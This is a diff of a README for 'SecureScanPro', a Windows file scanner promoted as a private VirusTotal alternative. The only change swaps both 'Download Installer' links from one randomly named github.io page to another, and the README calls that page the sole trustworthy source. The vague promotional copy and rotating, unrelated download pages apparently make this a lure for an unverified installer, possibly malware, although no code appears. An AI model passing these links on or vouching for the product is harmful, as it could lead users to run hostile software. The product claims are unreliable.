@@ -2,7 +2,7 @@
 
 SecureScanPro is a cutting-edge VirusTotal alternative designed for private and secure file analysis on Windows 10 and Windows 11. As a multi-engine scanner, it allows users to scan files against numerous antivirus engines without uploading them to public servers, ensuring complete privacy and data protection. Whether you're a cybersecurity professional, IT administrator, or an enthusiast, SecureScanPro offers a reliable and efficient way to detect threats in 2026 and beyond. Its intuitive interface and advanced capabilities make it a top choice for those seeking a comprehensive desktop tool for file scanning.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -59,7 +59,7 @@ SecureScanPro supports files of all common sizes, from small documents to large 
 
 For the latest version of SecureScanPro, including updates and new features for 2026, please visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This is the only recommended source for downloads to ensure you receive a secure and authentic copy of the tool.
 
